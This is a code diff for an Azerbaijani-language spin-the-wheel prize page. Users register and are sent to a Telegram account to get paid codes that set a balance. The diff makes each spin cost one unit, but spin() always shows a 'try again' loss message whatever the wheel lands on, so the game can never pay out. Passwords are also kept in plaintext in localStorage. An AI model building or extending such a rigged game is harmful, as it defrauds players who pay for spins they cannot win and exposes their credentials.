@@ -12,35 +12,9 @@ button:hover { background:#555; }
 #topMessage { background:#222; color:#FFD700; padding:10px; border-radius:8px; margin-bottom:15px; font-weight:bold; }
 .hidden { display:none; }
 #msg, #msgSpin, #regMsg { margin-top:10px; color:#FFD700; font-weight:bold; }
-
-#wheel {
-  margin:20px auto;
-  width:250px;
-  height:250px;
-  border-radius:50%;
-  border:5px solid white;
-  position: relative;
-  transition: transform 3s ease-out;
-}
-
-.slice {
-  position:absolute;
-  width:50%;
-  height:50%;
-  top:50%;
-  left:50%;
-  transform-origin:0% 0%;
-  display:flex;
-  justify-content:flex-start;
-  align-items:flex-start;
-}
-
-.slice-text {
-  transform: translate(50%, -50%) rotate(30deg); /* dilim ortasına yazı */
-  font-weight:bold;
-  font-size:14px;
-  color:white;
-}
+#wheel-container { position:relative; width:250px; height:250px; margin:20px auto; }
+#wheel { width:250px; height:250px; border-radius:50%; border:5px solid white; transition: transform 3s ease-out; }
+#wheel text { font-weight:bold; font-size:14px; fill:white; text-anchor:middle; dominant-baseline:middle; }
 #pointer { width:0; height:0; border-left:15px solid transparent; border-right:15px solid transparent; border-bottom:30px solid white; margin:-30px auto 0 auto; }
 </style>
 </head>
@@ -75,20 +49,22 @@ button:hover { background:#555; }
 <h2>Çarx Paneli</h2>
 <p id="balanceText">Balans: 0 ₼</p>
 <div id="pointer"></div>
-<div id="wheel"></div>
+<div id="wheel-container">
+  <svg id="wheel" viewBox="0 0 250 250"></svg>
+</div>
 <button onclick="spin()">Çarxi fırlat</button>
 <p id="msgSpin"></p>
 </div>
 
 <script>
-// GLOBALS
-let deg = 0;
+// Kodlar və balans
 let balance = 0;
 let userPhone = null;
 let usedPhone = null;
-const codeMap = { "005": 1, "00-MH":5, "00-7A":10, "00-6T":3, "00-63U":20 };
+let deg = 0;
+const codeMap = { "005":1, "00-MH":5, "00-7A":10, "00-6T":3, "00-63U":20 };
 
-// Slice data
+// Çarx bölmələri
 const slices = [
   { text:"1 ₼", color:"#ff4d4d" },
   { text:"5 ₼", color:"#4dff4d" },
@@ -98,23 +74,37 @@ const slices = [
   { text:"BOŞ", color:"#4dffff" }
 ];
 
-// DRAW WHEEL
+// DRAW WHEEL (SVG dairəvi)
 function drawWheel(){
-  const wheel = document.getElementById("wheel");
-  wheel.innerHTML = "";
-  const sliceDeg = 360 / slices.length;
-  slices.forEach((slice, i)=>{
-    const div = document.createElement("div");
-    div.className="slice";
-    div.style.background=slice.color;
-    div.style.transform=`rotate(${i*sliceDeg}deg) skewY(-60deg)`;
-    
-    const span = document.createElement("span");
-    span.className="slice-text";
-    span.innerText=slice.text;
-    span.style.transform=`rotate(${sliceDeg/2}deg)`; // ortada görünməsi üçün
-    div.appendChild(span);
-    wheel.appendChild(div);
+  const svg = document.getElementById("wheel");
+  svg.innerHTML = "";
+  const cx = 125, cy = 125, r=120;
+  const sliceAngle = 360 / slices.length;
+  slices.forEach((slice,i)=>{
+    const startAngle = sliceAngle*i;
+    const endAngle = startAngle + sliceAngle;
+    const rad1 = (startAngle-90)*Math.PI/180;
+    const rad2 = (endAngle-90)*Math.PI/180;
+    const x1 = cx + r*Math.cos(rad1);
+    const y1 = cy + r*Math.sin(rad1);
+    const x2 = cx + r*Math.cos(rad2);
+    const y2 = cy + r*Math.sin(rad2);
+    const path = document.createElementNS("http://www.w3.org/2000/svg","path");
+    path.setAttribute("d",`M ${cx} ${cy} L ${x1} ${y1} A ${r} ${r} 0 0 1 ${x2} ${y2} Z`);
+    path.setAttribute("fill",slice.color);
+    svg.appendChild(path);
+    // Yazı
+    const angle = (startAngle + sliceAngle/2 - 90) * Math.PI/180;
+    const tx = cx + r*0.65*Math.cos(angle);
+    const ty = cy + r*0.65*Math.sin(angle);
+    const text = document.createElementNS("http://www.w3.org/2000/svg","text");
+    text.setAttribute("x",tx);
+    text.setAttribute("y",ty);
+    text.textContent = slice.text;
+    text.setAttribute("fill","white");
+    text.setAttribute("text-anchor","middle");
+    text.setAttribute("dominant-baseline","middle");
+    svg.appendChild(text);
   });
 }
 
@@ -129,29 +119,26 @@ function showRegister(){
 
 // REGISTER
 function register(){
-  let user = document.getElementById("regUser").value.trim();
-  let email = document.getElementById("regEmail").value.trim();
-  let pass = document.getElementById("regPass").value.trim();
-  if(!user || !email || !pass){ document.getElementById("regMsg").innerText="Bütün xanaları doldur!"; return; }
-  localStorage.setItem("userData", JSON.stringify({user,email,pass}));
+  const user=document.getElementById("regUser").value.trim();
+  const email=document.getElementById("regEmail").value.trim();
+  const pass=document.getElementById("regPass").value.trim();
+  if(!user||!email||!pass){ document.getElementById("regMsg").innerText="Bütün xanaları doldur!"; return;}
+  localStorage.setItem("userData",JSON.stringify({user,email,pass}));
   document.getElementById("regMsg").innerText="Qeydiyyat tamamlandı! Hesabınızı aktiv etmək üçün Telegramda bizə yazın.";
-  let message = `Mən qeydiyyatdan keçdim, hesabımı aktiv edin.\nİstifadəçi adı: ${user}\nEmail: ${email}`;
-  window.open("https://t.me/carxfirla?text=" + encodeURIComponent(message), "_blank");
+  const message=`Mən qeydiyyatdan keçdim, hesabımı aktiv edin.\nİstifadəçi adı: ${user}\nEmail: ${email}`;
+  window.open("https://t.me/carxfirla?text="+encodeURIComponent(message),"_blank");
 }
 
 // LOGIN
 function login(){
-  let user = document.getElementById("loginUser").value.trim();
-  let pass = document.getElementById("loginPass").value.trim();
-  let code = document.getElementById("loginCode").value.trim();
-  let msg = document.getElementById("msg");
-
-  if(!user || !pass || !code){ msg.innerText="Bütün xanaları doldurun!"; return; }
-  if(!codeMap[code]){ msg.innerText="Kod səhvdir. Yeni kod üçün Telegram vasitəsilə əlaqə saxlayın."; return; }
-
-  if(!userPhone){ userPhone=prompt("Telefon nömrənizi daxil edin:"); usedPhone=userPhone; }
-  else if(userPhone!==usedPhone){ balance=0; msg.innerText="Bu kod yalnız sizin telefonunuz üçün aktivdir. Balans 0 göstərilir."; return; }
-
+  const user=document.getElementById("loginUser").value.trim();
+  const pass=document.getElementById("loginPass").value.trim();
+  const code=document.getElementById("loginCode").value.trim();
+  const msg=document.getElementById("msg");
+  if(!user||!pass||!code){ msg.innerText="Bütün xanaları doldurun!"; return;}
+  if(!codeMap[code]){ msg.innerText="Kod səhvdir. Yeni kod üçün Telegram vasitəsilə əlaqə saxlayın."; return;}
+  if(!userPhone){ userPhone=prompt("Telefon nömrənizi daxil edin:"); usedPhone=userPhone;}
+  else if(userPhone!==usedPhone){ balance=0; msg.innerText="Bu kod yalnız sizin telefonunuz üçün aktivdir. Balans 0 göstərilir."; return;}
   balance = codeMap[code];
   document.getElementById("login").classList.add("hidden");
   document.getElementById("register").classList.add("hidden");
@@ -165,11 +152,12 @@ function updateBalance(){ document.getElementById("balanceText").innerText="Bala
 
 // SPIN
 function spin(){
+  if(balance<=0){ document.getElementById("msgSpin").innerText="Balans yoxdur!"; return;}
   deg += 360*5 + Math.floor(Math.random()*360);
-  document.getElementById("wheel").style.transform="rotate("+deg+"deg)";
-  setTimeout(()=>{
-    document.getElementById("msgSpin").innerText="Bəxtinizi Bir Daha Sınaayın 😞";
-  },3000);
+  document.getElementById("wheel").style.transform=`rotate(${deg}deg)`;
+  balance -=1;
+  updateBalance();
+  setTimeout(()=>{ document.getElementById("msgSpin").innerText="Bəxtinizi Bir Daha Sınaayın 😞"; },3000);
 }
 </script>
 
